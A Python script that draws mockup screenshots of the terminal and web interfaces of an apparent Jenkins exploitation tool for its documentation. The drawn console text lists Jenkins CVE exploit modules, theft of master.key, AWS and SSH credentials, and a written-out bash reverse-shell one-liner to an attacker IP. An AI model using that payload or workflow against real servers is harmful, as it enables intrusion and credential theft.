#!/usr/bin/env python3
"""
Capture TUI and WebUI screenshots for documentation.
This script creates mockup screenshots of the interfaces.
"""
from pathlib import Path
from PIL import Image, ImageDraw, ImageFont

REPO_ROOT = Path(__file__).parent.parent
SCREENSHOTS_DIR = REPO_ROOT / "docs" / "screenshots"
SCREENSHOTS_DIR.mkdir(parents=True, exist_ok=True)

def create_tui_mockup():
    """Create a mockup of the TUI interface"""
    width, height = 1200, 800
    img = Image.new('RGB', (width, height), color='#1e1e1e')
    draw = ImageDraw.Draw(img)
    
    try:
        font_title = ImageFont.truetype("consola.ttf", 16)
        font_text = ImageFont.truetype("consola.ttf", 12)
    except:
        font_title = ImageFont.load_default()
        font_text = ImageFont.load_default()
    
    # Header
    draw.rectangle([0, 0, width, 50], fill='#007acc')
    draw.text((20, 15), "JenkinsBreaker TUI - Interactive Exploitation Terminal", fill='white', font=font_title)
    
    # Sidebar
    draw.rectangle([0, 50, 250, height], fill='#252526')
    draw.text((10, 60), "TARGET INFO", fill='#569cd6', font=font_title)
    draw.text((10, 90), "URL: http://localhost:8080", fill='#d4d4d4', font=font_text)
    draw.text((10, 110), "Status: Reachable", fill='#4ec9b0', font=font_text)
    draw.text((10, 130), "Version: 2.426.1", fill='#d4d4d4', font=font_text)
    draw.text((10, 150), "Auth: admin:admin", fill='#d4d4d4', font=font_text)
    
    draw.text((10, 190), "EXPLOITS (28)", fill='#569cd6', font=font_title)
    exploits = [
        "CVE-2024-23897 - File Read",
        "CVE-2024-43044 - Agent RCE",
        "CVE-2019-1003029 - Groovy",
        "FEATURE-SCRIPT-CONSOLE",
        "CVE-2022-43401 - Pipeline",
        "..."
    ]
    y = 220
    for exploit in exploits:
        draw.text((10, y), f"• {exploit}", fill='#d4d4d4', font=font_text)
        y += 20
    
    draw.text((10, 400), "CREDENTIALS (16)", fill='#569cd6', font=font_title)
    draw.text((10, 430), "• AWS Keys (4)", fill='#4ec9b0', font=font_text)
    draw.text((10, 450), "• SSH Keys (3)", fill='#4ec9b0', font=font_text)
    draw.text((10, 470), "• Docker Auth (2)", fill='#4ec9b0', font=font_text)
    
    # Main content area
    draw.rectangle([250, 50, width, height], fill='#1e1e1e')
    
    # Console output
    draw.text((270, 70), "Exploitation Console", fill='#569cd6', font=font_title)
    
    console_lines = [
        "[*] Initializing JenkinsBreaker...",
        "[+] Target: http://localhost:8080",
        "[+] Authentication successful: admin",
        "[*] Enumerating plugins and version...",
        "[+] Jenkins 2.426.1 detected",
        "[*] Loading 28 exploit modules...",
        "[+] Modules loaded successfully",
        "",
        "[*] Running CVE-2024-23897: CLI Arbitrary File Read",
        "[+] Exploit successful!",
        "[+] Reading file: /var/jenkins_home/secrets/master.key",
        "[+] Content extracted (32 bytes)",
        "",
        "[*] Extracting credentials from jenkins_home...",
        "[+] Found AWS credentials: AKIAIOSFODNN7EXAMPLE",
        "[+] Found SSH key: /var/jenkins_home/.ssh/id_rsa",
        "[+] Found Docker auth: ~/.docker/config.json",
        "",
        "[*] Generating reverse shell payload...",
        "[+] Payload: bash -i >& /dev/tcp/10.10.14.5/4444 0>&1",
        "[*] Executing via Script Console...",
        "[+] Shell established!",
        "",
        "[SUCCESS] Exploitation complete. 16 credentials extracted.",
    ]
    
    y = 100
    for line in console_lines:
        if line.startswith('[+]'):
            color = '#4ec9b0'  # Green
        elif line.startswith('[*]'):
            color = '#569cd6'  # Blue
        elif line.startswith('[SUCCESS]'):
            color = '#4ec9b0'  # Green
        else:
            color = '#d4d4d4'  # White
        
        draw.text((270, y), line, fill=color, font=font_text)
        y += 20
    
    # Status bar
    draw.rectangle([0, height-30, width, height], fill='#007acc')
    draw.text((10, height-25), "Status: Exploitation Complete | Modules: 28 | Credentials: 16 | Time: 00:02:34", 
              fill='white', font=font_text)
    
    output_path = SCREENSHOTS_DIR / "tui_interface.png"
    img.save(output_path)
    print(f"Saved: {output_path}")

def create_webui_mockup():
    """Create a mockup of the Web UI dashboard"""
    width, height = 1400, 900
    img = Image.new('RGB', (width, height), color='#f5f5f5')
    draw = ImageDraw.Draw(img)
    
    try:
        font_title = ImageFont.truetype("arial.ttf", 18)
        font_heading = ImageFont.truetype("arial.ttf", 14)
        font_text = ImageFont.truetype("arial.ttf", 12)
    except:
        font_title = ImageFont.load_default()
        font_heading = ImageFont.load_default()
        font_text = ImageFont.load_default()
    
    # Header
    draw.rectangle([0, 0, width, 60], fill='#2c3e50')
    draw.text((20, 20), "JenkinsBreaker Web UI - Dashboard", fill='white', font=font_title)
    
    # Stats cards
    cards = [
        (20, 80, 320, 200, "Targets", "3", "#3498db"),
        (340, 80, 640, 200, "Exploits Available", "28", "#2ecc71"),
        (660, 80, 960, 200, "Credentials Found", "16", "#e74c3c"),
        (980, 80, 1280, 200, "Reports Generated", "5", "#f39c12"),
    ]
    
    for x1, y1, x2, y2, title, value, color in cards:
        draw.rectangle([x1, y1, x2, y2], fill=color, outline=color)
        draw.text((x1 + 20, y1 + 20), title, fill='white', font=font_heading)
        draw.text((x1 + 20, y1 + 60), value, fill='white', font=font_title)
    
    # Target status table
    draw.rectangle([20, 220, 1380, 420], fill='white', outline='#ddd', width=2)
    draw.text((30, 230), "Active Targets", fill='#2c3e50', font=font_heading)
    
    # Table header
    draw.rectangle([30, 260, 1370, 290], fill='#ecf0f1')
    headers = [("URL", 40), ("Status", 350), ("Version", 550), ("Exploits", 750), ("Credentials", 950)]
    for text, x in headers:
        draw.text((x, 268), text, fill='#2c3e50', font=font_text)
    
    # Table rows
    rows = [
        ("http://localhost:8080", "Exploited", "2.426.1", "12/28", "16"),
        ("http://jenkins.local", "Scanning", "2.401.0", "0/28", "0"),
        ("http://10.10.10.5:8080", "Reachable", "2.387.3", "0/28", "0"),
    ]
    
    y = 300
    for url, status, version, exploits, creds in rows:
        status_color = '#2ecc71' if status == "Exploited" else '#f39c12'
        draw.text((40, y), url, fill='#2c3e50', font=font_text)
        draw.text((350, y), status, fill=status_color, font=font_text)
        draw.text((550, y), version, fill='#2c3e50', font=font_text)
        draw.text((750, y), exploits, fill='#2c3e50', font=font_text)
        draw.text((950, y), creds, fill='#2c3e50', font=font_text)
        y += 30
    
    # Exploit modules panel
    draw.rectangle([20, 440, 680, 880], fill='white', outline='#ddd', width=2)
    draw.text((30, 450), "Available Exploit Modules", fill='#2c3e50', font=font_heading)
    
    modules = [
        ("CVE-2024-23897", "File Read", "Critical"),
        ("CVE-2024-43044", "Agent RCE", "Critical"),
        ("CVE-2019-1003029", "Groovy RCE", "Critical"),
        ("CVE-2022-43401", "Pipeline Bypass", "High"),
        ("CVE-2023-24422", "Sandbox Bypass", "High"),
        ("CVE-2021-21686", "Path Traversal", "High"),
        ("FEATURE-SCRIPT-CONSOLE", "RCE", "Critical"),
        ("CVE-2018-1000861", "Stapler RCE", "Critical"),
    ]
    
    y = 480
    for cve, desc, severity in modules:
        severity_color = '#e74c3c' if severity == "Critical" else '#f39c12'
        draw.text((40, y), cve, fill='#2c3e50', font=font_text)
        draw.text((300, y), desc, fill='#7f8c8d', font=font_text)
        draw.text((500, y), severity, fill=severity_color, font=font_text)
        y += 35
    
    # Recent activity panel
    draw.rectangle([700, 440, 1380, 880], fill='white', outline='#ddd', width=2)
    draw.text((710, 450), "Recent Activity", fill='#2c3e50', font=font_heading)
    
    activities = [
        ("[00:02:34]", "Exploitation complete on localhost:8080"),
        ("[00:02:12]", "16 credentials extracted"),
        ("[00:01:45]", "CVE-2024-23897 successful"),
        ("[00:01:23]", "Reading /var/jenkins_home/secrets/master.key"),
        ("[00:00:58]", "Authentication successful: admin"),
        ("[00:00:34]", "Target enumeration started"),
        ("[00:00:12]", "Loaded 28 exploit modules"),
        ("[00:00:05]", "Connected to http://localhost:8080"),
    ]
    
    y = 480
    for timestamp, activity in activities:
        draw.text((720, y), timestamp, fill='#7f8c8d', font=font_text)
        draw.text((820, y), activity, fill='#2c3e50', font=font_text)
        y += 35
    
    output_path = SCREENSHOTS_DIR / "webui_dashboard.png"
    img.save(output_path)
    print(f"Saved: {output_path}")

if __name__ == "__main__":
    print("Creating UI mockup screenshots...")
    create_tui_mockup()
    create_webui_mockup()
    print("\nUI screenshots created successfully!")
